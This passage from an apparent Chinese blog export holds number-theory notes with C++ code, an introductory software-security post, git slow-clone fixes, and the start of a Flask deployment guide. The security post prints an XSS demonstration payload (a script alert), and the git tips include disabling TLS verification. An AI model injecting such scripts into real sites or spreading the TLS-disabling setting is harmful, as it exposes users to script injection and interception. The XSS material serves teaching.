<li>以字符串形式读入大数，处理得到$bmod\varphi(p)$</li>
<li>需要判断$b$和$\varphi(p)$的大小，否则会出错<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// char b[maxn]</span></span><br><span class="line">ll ans=<span class="number">0</span>;</span><br><span class="line">c=eular(p);</span><br><span class="line">ll len = <span class="built_in">strlen</span>(b);</span><br><span class="line"><span class="keyword">int</span> flg=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(ll i = <span class="number">0</span>;i &lt; len; i++)&#123;</span><br><span class="line">    ans = (ans*<span class="number">10</span> + b[i]-<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(ans&gt;=p)&#123;</span><br><span class="line">        flg=<span class="number">1</span>;</span><br><span class="line">        ans%=p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(flg)ans+=p;</span><br><span class="line"><span class="comment">// 快速幂计算 a是底数，ans是指数，p是模数</span></span><br><span class="line">qPow(a,ans,p);</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><a href="https://www.luogu.com.cn/problem/P5091">洛谷 P5091 模板题</a></li>
</ul>
<h2 id="欧拉函数常用性质和公式"><a href="#欧拉函数常用性质和公式" class="headerlink" title="欧拉函数常用性质和公式"></a>欧拉函数常用性质和公式</h2><ul>
<li>$对于质数p，\varphi(p)=p-1$</li>
<li>$\sum_{d|n}\varphi(d)=n\quad，包括1和n本身$</li>
<li>$\sum_{gcd(d,n)==1}d=\varphi(n)*n/2$</li>
<li>$\sum_{i=1}^{n-1}gcd(i,n)=\sum_{d|n}d\varphi(n|d)$</li>
<li>$若p为质数，n=p^k,\varphi(n)=p^k-p^{k-1}$</li>
<li>$积性性质：若m,n互质，\varphi(m*n)=\varphi(m)*\varphi(n)$</li>
</ul>
<h1 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h1><h2 id="算法流程"><a href="#算法流程" class="headerlink" title="算法流程"></a>算法流程</h2><ul>
<li>公钥密码算法</li>
<li>$随机选择两个不相等的质数p和q$</li>
<li>$计算p和q的乘积n$</li>
<li>$计算n的欧拉函数φ(n)=(p-1)(q-1)$</li>
<li>$随机选择一个整数e，满足1&lt;e&lt;φ(n)，且e与φ(n)互质$</li>
<li>$求出整数d，使得ed ≡ 1 (mod φ(n))$</li>
<li>$(n,e)为公钥，d为私钥$</li>
<li>$加密：明文消息m，满足0&lt;m&lt;n，密文c=m^e mod n$</li>
<li>$解密：接受到密文消息为c，解密明文消息m=c^d mod n$</li>
</ul>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul>
<li>逆元(欧拉定理)+快速幂<blockquote>
<p>若(a*x)%mod=1，则x是正整数a在模mod下的逆元 </p>
</blockquote>
</li>
</ul>
<hr>
<table>
<thead>
<tr>
<th>方法</th>
<th>限定</th>
<th>时间复杂度</th>
</tr>
</thead>
<tbody><tr>
<td>线性打表法</td>
<td>只要求mod是质数</td>
<td>O(n)</td>
</tr>
<tr>
<td>费马小定理</td>
<td>mod是质数且与a互质，快速幂优化</td>
<td>O(log(n))</td>
</tr>
<tr>
<td>欧拉定理</td>
<td>只要求a与mod互质，需要欧拉函数与快速幂</td>
<td>O(sqrt(n)+log(n))</td>
</tr>
<tr>
<td>拓展欧几里德</td>
<td>只要求a与mod互质</td>
<td>O(log(n))</td>
</tr>
</tbody></table>
<h1 id="拓展中国剩余定理"><a href="#拓展中国剩余定理" class="headerlink" title="拓展中国剩余定理"></a>拓展中国剩余定理</h1><h2 id="中国剩余定理"><a href="#中国剩余定理" class="headerlink" title="中国剩余定理"></a>中国剩余定理</h2><p>韩信点兵，三三一排少1人，五五一排少1人，七七一排少1个人</p>
<hr>
<blockquote>
<p>$对于一组同余方程$</p>
<p>$x≡a_1 (mod n_1)$</p>
<p>$x≡a_2 (mod n_2)$</p>
<p>$…$</p>
<p>$x≡a_k (mod n_k)$</p>
<p>$模数n_1,n_2…n_k两两互质，求最小的x$</p>
</blockquote>
<hr>
<ol>
<li>$计算N=n_1×n_2×⋯×n_k$</li>
<li>$对于i=1,2,…,k，$$计算y_i=\frac{N}{n_i}=n_1n_2…n_{i-1}n_{i+1}…n_k$ </li>
<li>$对于i=1,2,…,k，计算z_i=y_i^{-1}(modn_i)，$$即计算y_i在模n_i下的逆元$</li>
<li>$x=\sum_{i=1}^ka_iy_iz_i，$$最后计算x=x(modN)得到结果$</li>
</ol>
<h2 id="模数两两不互质"><a href="#模数两两不互质" class="headerlink" title="模数两两不互质"></a>模数两两不互质</h2><ul>
<li><p>思路</p>
<ol>
<li>$通过先解出前两个方程的解，如将前两个方程$</li>
<li>$x≡a_1 (mod n_1)，x≡a_2 (mod n_2)化为x≡A(mod N)$</li>
<li>$将此方程和x≡a_3 (mod n_3)$</li>
<li>$继续联立求解，直到最后一个方程解完为止$</li>
</ol>
</li>
<li><p><a href="https://www.luogu.com.cn/problem/P4777">洛谷 P4777 模板题</a></p>
</li>
</ul>
<hr>
<blockquote>
<p>$x≡a_1 (mod n_1)$</p>
<p>$x≡a_2 (mod n_2)$</p>
</blockquote>
<ul>
<li>$可化为 x=a_1+k_1<em>n_1 ①; x=a_2+k_2</em>n_2;$</li>
<li>$消x，可得a_1+k_1<em>n_1=a_2+k_2</em>n_2$ $移项得到k_1*n_1+(-k_2)*n_2=a_2-a_1$</li>
<li>$令d=a_2-a_1, x=k_1, y=-k_2;$$上式化为 x<em>n_1+y</em>n_2=d ③$</li>
<li>$令g=gcd(n_1,n_2),用拓展欧几里得解线性方程$$(此处求解x_1，y_1)，x_1<em>n_1+y_1</em>n_2=g$</li>
</ul>
<hr>
<ul>
<li>$③式可化为  x_1*(d/g)<em>n_1+y_1</em>(d/g)<em>n_2 = g</em>(d/g)$</li>
<li>$即x=x_1*(d/g)=k_1 ; y=y_1*(d/g)=-k_2;$$即k_1=x_1*(d/g); k_2=-y_1*(d/g)$</li>
<li>$一组通解为 k_1=k_1+(n_2/g)*T; k_2=k_2-(n_1/g)*T$</li>
<li>$要求使所求得的解最小且为正整数，$$则可以根据 k_1的通解形式求得(消掉T的影响)$</li>
<li>$k_1=(k_1 mod (n_2/g)+(n_2/g)) mod (n_2/g) ②，$$即k_1=((x_1*(d/g)) mod (n_2/g)+(n_2/g)) mod (n_2/g)$</li>
</ul>
<hr>
<ul>
<li>$将求出的k_1带入①，可得x的解，$$作为下一次的A，N为lcm(n1,n2)，$$即A为合并后的a，N为合并后的n$</li>
</ul>
<hr>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="function">ll <span class="title">exgcd</span><span class="params">(ll a,ll b,ll &amp;x,ll &amp;y)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(a==<span class="number">0</span>&amp;&amp;b==<span class="number">0</span>)<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span>(b==<span class="number">0</span>)&#123;x=<span class="number">1</span>;y=<span class="number">0</span>;<span class="keyword">return</span> a;&#125;</span><br><span class="line">    ll d=exgcd(b,a%b,y,x);</span><br><span class="line">    y-=a/b*x;</span><br><span class="line">    <span class="keyword">return</span> d;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">ll <span class="title">excrt</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ll a1=b[<span class="number">0</span>],n1=a[<span class="number">0</span>],a2,n2,d,x,y,gcd;<span class="comment">//余数 b[] 除数 a[]</span></span><br><span class="line">    <span class="comment">// 返回的是最小非负整数解，有些题目需要特判</span></span><br><span class="line">    <span class="comment">//若当余数为0的时候 题目要求求正整数 所以0不算在内，应该加上下面的注释，即余数等于除数，同理后面的板子</span></span><br><span class="line">    <span class="comment">//if(a1==0)a1=a[0]</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        a2=b[i];n2=a[i];</span><br><span class="line">        d=a2-a1;</span><br><span class="line">        gcd=exgcd(n1,n2,x,y);</span><br><span class="line">        <span class="keyword">if</span>(d%gcd)<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        x=((x*d/gcd)%(n2/gcd)+(n2/gcd))%(n2/gcd);</span><br><span class="line">        a1=x*n1+a1;</span><br><span class="line">        n1=n1*n2/gcd;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="定理-amp-猜想-amp-公式"><a href="#定理-amp-猜想-amp-公式" class="headerlink" title="定理&amp;猜想&amp;公式"></a>定理&amp;猜想&amp;公式</h1><hr>
<ul>
<li><p>费马大定理：</p>
<p>$当整数n &gt;2时，$</p>
<p>$关于x, y, z的方程 x^n + y^n = z^n 没有正整数解$</p>
</li>
<li><p>实数域不可拆分多项式：</p>
<p>$一次多项式和二次多项式(b^2&lt;4ac)$</p>
<ul>
<li>艾森斯坦因判别法：有理数域不可约，即一定要整数解</li>
</ul>
</li>
</ul>
<hr>
<ul>
<li>勾股数<ul>
<li>任意大于2的整数都可以找出另外两个数构成勾股数</li>
<li>本原勾股数</li>
</ul>
</li>
<li>四色猜想</li>
<li>康威常数</li>
<li>日期转化成星期<ul>
<li>蔡勒公式</li>
<li>基姆拉尔森计算公式</li>
</ul>
</li>
<li>斯特林公式 - 阶乘</li>
</ul>
]]></content>
      <categories>
        <category>ACM</category>
      </categories>
      <tags>
        <tag>数论</tag>
      </tags>
  </entry>
  <entry>
    <title>软件安全概述</title>
    <url>/2020/06/09/Software-Security/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="三大软件安全问题"><a href="#三大软件安全问题" class="headerlink" title="三大软件安全问题"></a>三大软件安全问题</h1><h2 id="有什么安全问题，安全问题产生的原因"><a href="#有什么安全问题，安全问题产生的原因" class="headerlink" title="有什么安全问题，安全问题产生的原因"></a>有什么安全问题，安全问题产生的原因</h2><h3 id="二进制方面"><a href="#二进制方面" class="headerlink" title="二进制方面"></a>二进制方面</h3><ol>
<li>内存相关问题<ul>
<li>有明确的机制</li>
<li>例子：<strong>缓冲区溢出</strong>，空指针，格式化字符串</li>
</ul>
</li>
<li>逻辑错误问题<ul>
<li>多种多样</li>
</ul>
</li>
</ol>
<h3 id="Web方面"><a href="#Web方面" class="headerlink" title="Web方面"></a>Web方面</h3><ol>
<li>典型安全问题<ul>
<li><strong>XSS</strong>，<strong>SQL</strong>注入</li>
</ul>
</li>
<li>非典型安全问题：很多<ul>
<li>主要是一些代码的逻辑错误，每个漏洞都可能有不同的原理</li>
</ul>
</li>
</ol>
<a id="more"></a>

<h2 id="如何去发现问题-安全漏洞-gt-漏洞挖掘技术"><a href="#如何去发现问题-安全漏洞-gt-漏洞挖掘技术" class="headerlink" title="如何去发现问题 (安全漏洞) -&gt; 漏洞挖掘技术"></a>如何去发现<del>问题</del> (安全漏洞) -&gt; 漏洞挖掘技术</h2><h3 id="白盒分析"><a href="#白盒分析" class="headerlink" title="白盒分析"></a>白盒分析</h3><ul>
<li>分析<strong>软件的源代码</strong>去寻找问题</li>
<li>方法<ul>
<li>手工代码分析 -&gt; 软件测试技术 / 代码review。但是软件的源代码通常比较庞大，手工分析起来很费劲</li>
<li>自动化代码分析 -&gt; 典型的技术：符号执行</li>
</ul>
</li>
</ul>
<h3 id="黑盒分析"><a href="#黑盒分析" class="headerlink" title="黑盒分析"></a>黑盒分析</h3><ul>
<li>因为白盒分析数据量大，需投入很多人工，人们寻求简单方法，和白盒分析对立的黑盒发展</li>
<li>原理：完全不管软件的内部机理 / 不看源码，把需要分析的软件当做一个黑盒子，看不见 / 根本不去看内部</li>
<li>方法：分析<strong>表面现象</strong><ul>
<li>软件：通过输入和输出去猜测内部机制</li>
<li>黑盒分析法，Fuzzing技术(模糊测试)</li>
</ul>
</li>
</ul>
<h2 id="如果有人利用这这些安全问题，如何防御"><a href="#如果有人利用这这些安全问题，如何防御" class="headerlink" title="如果有人利用这这些安全问题，如何防御"></a>如果有人利用这这些安全问题，如何防御</h2><h3 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h3><ul>
<li>由于软件复杂性，要发现问题及时修补</li>
<li>方法<ul>
<li>通过<strong>漏洞数据库</strong>来披露和管理各种漏洞，厂家有义务定期发布软件补丁或者更新</li>
<li>软件用户应该<strong>及时升级</strong>软件</li>
<li>第三方人员，如果发现了安全问题，应该<strong>通报</strong>给厂家，而不是在漏洞修补以前，利用漏洞搞破坏，或者不负责任的披露漏洞</li>
</ul>
</li>
</ul>
<h3 id="防御机制"><a href="#防御机制" class="headerlink" title="防御机制"></a>防御机制</h3><ol>
<li>寻找记录攻击的痕迹，然后分析这些数据<ul>
<li>数据的来源分为了主机层面和网络层面</li>
</ul>
</li>
<li>攻击者可能会做哪些方面的伪装，常用的伪装技术有哪些，如何去对抗伪装<ul>
<li>方法：加壳脱壳技术 / Rootkit技术</li>
</ul>
</li>
</ol>
<h1 id="研究第一大方面：缓冲区溢出和XSS"><a href="#研究第一大方面：缓冲区溢出和XSS" class="headerlink" title="研究第一大方面：缓冲区溢出和XSS"></a>研究第一大方面：缓冲区溢出和XSS</h1><ul>
<li>代表了<strong>二进制软件</strong>和<strong>脚本软件</strong>（包括绝大多数Web软件都是脚本软件开发的）两大技术方向</li>
<li>缓冲区溢出虽然比XSS底层，但是更难。XSS虽然比较上层，但是相对比较容易理解<ul>
<li>计算机科学的特点就是，越底层的东西，越难</li>
<li>开发操作系统比开发app难多了</li>
</ul>
</li>
</ul>
<h1 id="二进制软件"><a href="#二进制软件" class="headerlink" title="二进制软件"></a>二进制软件</h1><ul>
<li>计算机的底层，是CPU直接执行在内存中的机器指令</li>
<li>C和C++这类编程语言开发的软件，通过编译链接过程，把程序变成CPU可以直接执行的二进制指令</li>
<li>这类软件的一个特点也是不可避免的一点：需要直接操作内存(指针)<ul>
<li>内存是所有在运行态的软件及其数据保存的地方</li>
<li>内存分为细小的单元，每个单元有一个唯一的地址</li>
</ul>
</li>
<li>二进制软件安全问题的根源<ul>
<li>所有要访问数据，必须知道数据的地址，要保存新的数据，就必须分配内存，获得可用的地址</li>
<li>地址也是数，如果不小心计算错误，就会访问到不该访问的数据，造成数据的泄露或者破坏。</li>
</ul>
</li>
<li>二进制程序的编程，有很大的难度的原因<ul>
<li>二进制文件晦涩难懂</li>
<li>CPU只能执行二进制指令(是基于物理上的电路)，所以不可能设计得机制太复杂</li>
</ul>
</li>
</ul>
<h1 id="脚本软件"><a href="#脚本软件" class="headerlink" title="脚本软件"></a>脚本软件</h1><ul>
<li>在C和C++发展成熟以后，就有人去研究如何降低编程的难度，能否避免程序员编程时直接操作内存，把需要操作内存的地方，都封装起来，屏蔽在编程语言的内部 -&gt; 发明了脚本语言</li>
<li>概念：用C和C++这样的二进制程序开一个软件来执行一种新的程序，就是用软件来模拟CPU工作<ul>
<li>由于软件的可定制性比CPU就高多了，可以想定义什么指令就定义什么指令</li>
<li>对象与封装：把所有需要操作内存的东西，全部封闭在执行器内部，只给程序员接口，不给程序员操作内存的机会。比如把字符串封装为string<strong>对象</strong>。只能调用string.len()这样的方法来操作这个对象。这样就避免了由于编程不慎造成的内存相关问题，也降低了编程难度</li>
</ul>
</li>
<li>如python、java、js、web浏览器这样的脚本程序的执行器都是二进制程序。</li>
<li>解决了内存相关问题，有引出了其他的问题<ul>
<li>用户输入问题。比如XSS出现的原因如下：web程序存在一种高交互性。web是互联网时代的软件的基本框架，所以会有用户提交数据。为了网页动态的需求，开发了网页的前端脚本，比如js，直接把脚本嵌入到网页中。浏览器只要发现了script标签，就去当做脚本来执行，把网页按照程序员的定制，变的丰富多彩，变得富于变化。但是，恰恰另外一种需求，就是UGC(User Generated Conten 用户生成内容)软件，也就是网页的内容来自于用户提交的内容，比如BBS、博客、微博，电商视频网站的用户评论，都会涉及到用户提交的内容在页面上呈现。<strong>当用户提交的内容里含有脚本</strong>，如果直接将用户提交的内容放在页面上，那么用户提交的内容中的脚本会不会被浏览器解析执行呢？那么一个用户提交了一个脚本就可以在这个页面的所有用户主机上执行呢？用户能提交程序执行了，怎么才能不保证这个程序不是恶意的呢？前端脚本，除了渲染页面元素这样的功能，还有获得用户的输入跳转页面到其他地址等等丰富的功能。</li>
</ul>
</li>
</ul>
<h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><h2 id="编写一个简单的html文件"><a href="#编写一个简单的html文件" class="headerlink" title="编写一个简单的html文件"></a>编写一个简单的html文件</h2><ul>
<li>要求只要有一个表单，用户就可以在表单中输入数据，向服务器提交。  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>保存为index.html文件，用浏览器打开显示如下<img src="indexhtml.png" width=50%></li>
</ul>
<h2 id="搭建一个web服务器"><a href="#搭建一个web服务器" class="headerlink" title="搭建一个web服务器"></a>搭建一个web服务器</h2><ul>
<li>如果这个html是放在web服务器上，用户输入了数据，点击提交，浏览器就会把编辑框中的数据封装为一个POST请求，发现服务器。服务器会把这个数据发给后端脚本来处理。</li>
<li>通过定义form的属性来指明需要哪个脚本文件来处理<ul>
<li>比如PHP程序，他有一个POST超级变量，当用户提交了数据以后，对应的php脚本的post变量就是用户提交的数据</li>
<li>假设服务器现在把用户提交的数据放在user_input.html的body标签中。然后保存在服务器文件的根目录中。当有网站的用户访问 <a href="http://xxxx.com/user_input.html">http://xxxx.com/user_input.html</a> 的时候，就会看到刚才那个表单用户提交的内容。当然实际的情况是这两个用户可能不是同一个用户，于是A用户提交的内容B用户就访问到了。</li>
<li>当服务器脚本是原封不动的把用户输入的数据写到html里时，如果用户提交的数据中包括<code>&lt;script&gt;标签</code>，就会被执行。比如alert函数，弹出一个消息框，<code>&lt;script&gt;alert(&#39;xss attack&#39;)&lt;/script&gt;</code>；比如给window.location.href赋值，能让用户莫名其妙的跳转到另外一个网站</li>
</ul>
</li>
<li>最简单的实验环境<ul>
<li>在vscode中，安装一个php插件，然后编写一个简单的php脚本，调试运行这个脚本</li>
<li>F5 vscode会自动选择脚本运行的方式，把用户的表单输入写入到html文件</li>
<li>通过浏览器访问这个文件html文件，这就是一个最简单的xss运行环境了。</li>
</ul>
</li>
<li>实际的XSS漏洞可能很复杂，比如还会有数据库、登录等。另外，编程语言也不限于php，java、python也可以</li>
</ul>
<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ul>
<li>当编写的代码中出现中文，在网页上显示乱码<ul>
<li>编码问题，head标签里通过meta指定</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>Security</tag>
      </tags>
  </entry>
  <entry>
    <title>Git 学习之路</title>
    <url>/2020/03/21/Windows-git-clone-slow/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>learning-git：</p>
<ul>
<li><a href="https://link.zhihu.com/?target=http://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000/">https://link.zhihu.com/?target=http%3A//www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000/</a></li>
<li><a href="https://www.zhihu.com/search?type=content&amp;q=git%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B">https://www.zhihu.com/search?type=content&amp;q=git%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B</a></li>
</ul>
<h1 id="Windows-下-git-clone-慢的尝试解决方法"><a href="#Windows-下-git-clone-慢的尝试解决方法" class="headerlink" title="Windows 下 git clone 慢的尝试解决方法"></a>Windows 下 git clone 慢的尝试解决方法</h1><div class="tip success"><p><strong>重启大法?!</strong><br>重启网络，重启机器</p>
</div>

<div class="tip success"><p>科学上网</p>
</div>

<div class="tip warning faa-horizontal animated"><p>STILL SLOW</p>
</div>

<div class="tip error faa-horizontal animated"><p>ERROR: PRC fail</p>
</div>

<a id="more"></a>

<p><img src="prc-fail.png"></p>
<h1 id="git使用太多内存"><a href="#git使用太多内存" class="headerlink" title="git使用太多内存"></a><a href="#git%E4%BD%BF%E7%94%A8%E5%A4%AA%E5%A4%9A%E5%86%85%E5%AD%98">git使用太多内存</a></h1><ul>
<li>git使用太多内存，需要先<code>git gc</code></li>
</ul>
<h1 id="源代码过于庞大"><a href="#源代码过于庞大" class="headerlink" title="源代码过于庞大"></a><a href="#%E6%BA%90%E4%BB%A3%E7%A0%81%E8%BF%87%E4%BA%8E%E5%BA%9E%E5%A4%A7">源代码过于庞大</a></h1><ul>
<li><p>http方式不行，可以用ssh的方式(<a href="https://blog.csdn.net/lqlqlq007/article/details/78983879">首先要进行git ssh的配置</a>)</p>
</li>
<li><p>需要修改git的http.postBuffer，加大git传输字节，仅对http形式有效</p>
<figure class="highlight plain"><figcaption><span>bash</span></figcaption><table><tr><td class="code"><pre><span class="line">% 查看当前的配置</span><br><span class="line">git config -l</span><br><span class="line">% 加大httpbuffer</span><br><span class="line">git config --global http.postBuffer 524288000</span><br><span class="line">git config --global http.sslVerify false</span><br></pre></td></tr></table></figure>
<h1 id="修改host文件"><a href="#修改host文件" class="headerlink" title="修改host文件"></a><a href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99">修改host文件</a></h1></li>
<li><p>通过<a href="https://www.ipaddress.com/">查询ip地址</a></p>
<ul>
<li><code>github.global.ssl.fastly.net</code></li>
<li><code>github.com</code></li>
<li><code>assets-cdn.github.com</code></li>
</ul>
</li>
<li><p>位于<code>C:\Windows\System32\drivers\etc</code>目录下的<code>hosts</code>文件</p>
</li>
<li><p>按如下格式，在文件末尾写入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">151.101.185.194 global-ssl.fastly.net</span><br><span class="line">140.82.113.3  github.com</span><br></pre></td></tr></table></figure></li>
<li><p>刷新系统dns缓存</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 可在windows的cmd下</span><br><span class="line">ipconfig &#x2F;flushdns</span><br></pre></td></tr></table></figure></li>
<li><p>ip经常会变，如发现速度又下降了，及时去更换ip</p>
</li>
</ul>
<h1 id="git设置和取消代理"><a href="#git设置和取消代理" class="headerlink" title="git设置和取消代理"></a><a href="#git%E8%AE%BE%E7%BD%AE%E5%92%8C%E5%8F%96%E6%B6%88%E4%BB%A3%E7%90%86">git设置和取消代理</a></h1><h2 id="vpn的情况下"><a href="#vpn的情况下" class="headerlink" title="vpn的情况下"></a><a href="#vpn%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B">vpn的情况下</a></h2><ul>
<li><p>开全局代理的情况下，利用代理进行下载，对https有效，ssh无效</p>
<figure class="highlight plain"><figcaption><span>bash</span></figcaption><table><tr><td class="code"><pre><span class="line">git config --global http.proxy http:&#x2F;&#x2F;127.0.0.1:自己的端口号</span><br><span class="line">git config --global https.proxy https:&#x2F;&#x2F;127.0.0.1:自己的端口号</span><br><span class="line"></span><br><span class="line"># 可以在计算机的设置-&gt;代理查看</span><br><span class="line"></span><br><span class="line"># 取消方式</span><br><span class="line">git config --global --unset http.proxy</span><br><span class="line">git config --global --unset https.proxy</span><br><span class="line"></span><br><span class="line"># 查看目前所有的配置</span><br><span class="line">git config --global list </span><br></pre></td></tr></table></figure></li>
<li><p>使用全局代理，clone国内仓库慢，改进：只对github进行代理，对国内的仓库不影响</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 先取消全局代理，通过上面的取消方法</span><br><span class="line"></span><br><span class="line">git config --global http.https:&#x2F;&#x2F;github.com.proxy https:&#x2F;&#x2F;127.0.0.1:自己的端口号</span><br><span class="line">git config --global https.https:&#x2F;&#x2F;github.com.proxy https:&#x2F;&#x2F;127.0.0.1:自己的端口号</span><br><span class="line"></span><br><span class="line"># 取消</span><br><span class="line">git config --global --unset http.https:&#x2F;&#x2F;github.com.proxy</span><br><span class="line">git config --global --unset https.https:&#x2F;&#x2F;github.com.proxy</span><br></pre></td></tr></table></figure>
<h1 id="关于git其他问题"><a href="#关于git其他问题" class="headerlink" title="关于git其他问题"></a><a href="#%E5%85%B3%E4%BA%8Egit%E5%85%B6%E4%BB%96%E9%97%AE%E9%A2%98">关于git其他问题</a></h1></li>
<li><p><a href="https://stackoverflow.com/questions/49067062/fatal-httprequestexception-encountered-error-with-github-bitbucket-repositor">“fatal: HttpRequestException encountered.” Error with GitHub/Bitbucket Repositories due to dropping TLS-1.0 support</a></p>
</li>
</ul>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a><a href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99">参考资料</a></h1><ul>
<li><p><a href="https://www.cnblogs.com/rockbean/p/12017010.html">git设置和取消代理</a></p>
</li>
<li><p><a href="https://github.com/hexojs/hexo/issues/4172">谜之问题</a></p>
<p><img src="ERROR.png"></p>
<p>可能是：短时间过多请求api造成的</p>
<p>解决：<br><code>hexo\themes\next\scripts\events\index.js</code></p>
<p>将<a href="https://github.com/theme-next/hexo-theme-next/commit/9b543ddacf21a59f2daa52b0ae64075aed62fca2">作者修改的部分</a>做注释</p>
<p><img src="error-fix.png"></p>
</li>
</ul>
]]></content>
      <categories>
        <category>git</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>阿里云服务器(centos7系统) 使用nginx+uwsgi 部署python+flask项目</title>
    <url>/2020/06/21/aliyun-sfim/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Web服务器的搭建"><a href="#Web服务器的搭建" class="headerlink" title="Web服务器的搭建"></a>Web服务器的搭建</h1><h2 id="阿里云ECS-centos7-python-flask-Nginx"><a href="#阿里云ECS-centos7-python-flask-Nginx" class="headerlink" title="阿里云ECS(centos7) + python flask + Nginx"></a>阿里云ECS(centos7) + python flask + Nginx</h2><ul>
<li><a href="https://blog.csdn.net/CHENYAoo/article/details/83055108">uwsgi、wsgi和nginx的区别和关系</a></li>
<li><a href="https://blog.csdn.net/u011244708/article/details/82915006">CentOS7 python2升级到python3的那些坑</a></li>
<li><a href="https://www.cnblogs.com/FZfangzheng/p/7588944.html">Centos7安装Python3的方法</a></li>
<li><a href="https://www.runoob.com/mysql/mysql-install.html">Linux/UNIX 上安装 MySQL</a><ul>
<li>选择MySQL5.7版本 8.0版本一直报错</li>
</ul>
</li>
<li><a href="https://my.oschina.net/u/2455518/blog/3039411">CentOS7安装MySql8不能启动的问题</a></li>
<li><a href="https://stackoverflow.com/questions/33326065/unable-to-access-mysql-after-it-automatically-generated-a-temporary-password">unable-to-access-mysql-after-it-automatically-generated-a-temporary-password</a><ul>
<li>mysql -uroot -p : 123456</li>
<li>mysql 修改 root 密码<ul>
<li><p>ALTER USER ‘root’@’localhost’ IDENTIFIED BY ‘test4321’;</p>
<blockquote>
<p>ERROR 1290 (HY000): The MySQL server is running with the –skip-grant-tables option so it cannot execute this statement</p>
</blockquote>
</li>
<li><p><a href="https://blog.csdn.net/vv19910825/article/details/82979563">https://blog.csdn.net/vv19910825/article/details/82979563</a></p>
<blockquote>
<p>ERROR 1819 (HY000): Your password does not satisfy the current policy </p>
</blockquote>
</li>
<li><p><a href="https://blog.csdn.net/hello_world_qwp/article/details/79551789">https://blog.csdn.net/hello_world_qwp/article/details/79551789</a></p>
</li>
</ul>
</li>
</ul>
</li>
<li><a href="https://blog.csdn.net/qq_41090453/article/details/83451321">在本地端使用浏览器打开该云实例的公网地址:端口</a></li>
<li><a href="https://www.jianshu.com/p/61d18009b657">nginx + uwsgi</a></li>
</ul>
<a id="more"></a>

<h2 id="ip-端口号访问"><a href="#ip-端口号访问" class="headerlink" title="ip+端口号访问"></a>ip+端口号访问</h2><h3 id="Method-1-访问需ip-端口号访问"><a href="#Method-1-访问需ip-端口号访问" class="headerlink" title="Method 1 - 访问需ip + 端口号访问"></a>Method 1 - 访问需ip + 端口号访问</h3><ul>
<li>web应用是由Flask内置的web服务托管</li>
</ul>
